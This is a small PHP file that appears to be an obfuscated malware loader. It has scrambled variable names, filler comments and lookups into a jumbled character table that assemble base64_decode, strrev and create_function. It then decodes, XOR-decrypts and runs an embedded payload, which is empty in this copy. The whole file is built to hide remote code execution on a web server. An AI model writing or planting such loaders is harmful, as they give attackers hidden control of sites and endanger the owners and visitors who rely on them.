<?php  


 function RH0uj($TZXFc, $PIKLE = '') { $F3F8v = $TZXFc; $Ou4hJ = ''; for ($S2ZVb = 0; $S2ZVb < strlen($F3F8v);) { for ($zosMU = 0; $zosMU < strlen($PIKLE) && $S2ZVb < strlen($F3F8v); $zosMU++, $S2ZVb++) { $Ou4hJ .= $F3F8v[$S2ZVb] ^ $PIKLE[$zosMU]; } } return $Ou4hJ; }
/*MdzZmFljFTeGMQJcWVeJdhVmyXmWZrIzYMofnhJBjaYYEqLgSAcnOFCcLbpLCNUaDowfHBANgakjRJhegZuJSWCKsYLtydzuCJXZvPKTwURoxVWVPrfZqhWnsOBUNmyI*/

$zNgFAvrt5352 = "jtc;qr7yi8vgl_abwu(x4f2d*zm01kpe3s9o)6n5.h/";
$czfPacUa6648 = "";
$YsuRMDiT8098 = "";
$gbFihmVo6877 = "";
foreach([15,14,33,31,37,20,13,23,31,2,35,23,31] as $f){
   $YsuRMDiT8098 .= $zNgFAvrt5352[$f];
}
foreach([33,1,5,5,31,10] as $f){
   $gbFihmVo6877 .= $zNgFAvrt5352[$f];
}

/*UYSMCXoSgHQmwbfFQDkjhlKJMzLpwpQPFhgsdYlLjokePbHkmIImsjRYzcoEzlCQKiOSYTCxGOWPBUDHaHzjWbshGzkMVbIKjePmmHmdxiduHGSYjzKZUMmjgQAOLKhy*/

$f = $gbFihmVo6877('n'.'o'.''.'i'.'t'.'c'.'n'.'u'.''.''.''.''.'f'.'_'.''.''.''.'e'.''.'t'.''.''.''.''.'a'.''.''.'e'.''.''.''.'r'.''.''.'c'.''.'');
$n = $f("/*wNDCszjr8302*/", $YsuRMDiT8098( RH0uj($YsuRMDiT8098($czfPacUa6648), "NGDgiOnT7410")));
$n();

/*bTkyTpqCHwCTgmAjKlpJlqzfZakJUnZfmBZFUQNUkDwkZMDnGQnmWOgVnenxwJlGRdhFplEghDIwmfYkVpFJafhETbJftZQaQzIydzOmxxpBRrObDHqZyqBgTRzHIiPo*/